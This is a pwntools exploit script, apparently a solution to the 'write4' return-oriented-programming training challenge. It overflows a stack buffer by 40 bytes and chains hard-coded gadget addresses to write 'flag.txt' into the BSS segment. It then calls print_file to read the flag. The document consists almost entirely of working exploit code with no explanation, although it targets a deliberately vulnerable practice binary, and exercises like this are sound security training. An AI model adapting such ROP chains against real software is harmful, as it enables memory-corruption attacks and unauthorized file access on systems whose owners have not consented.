#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'write4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No

RIP_DIST = 40

POP_WHERE_WHAT = 0x0000000000400690
WRITE_WHAT_WHERE = 0x0000000000400628
WHERE = 0x601000 + 0x500 # BSS + 0x500
POP_RDI = 0x0000000000400693
PRINT_FILE = 0x400510
io = start()

pause()

io.sendline(cyclic(RIP_DIST) +
            flat(POP_WHERE_WHAT) + flat(WHERE) + b"flag.txt" +
            flat(WRITE_WHAT_WHERE) +
            flat(POP_RDI) + flat(WHERE) +
            flat(PRINT_FILE)
            )

io.interactive()
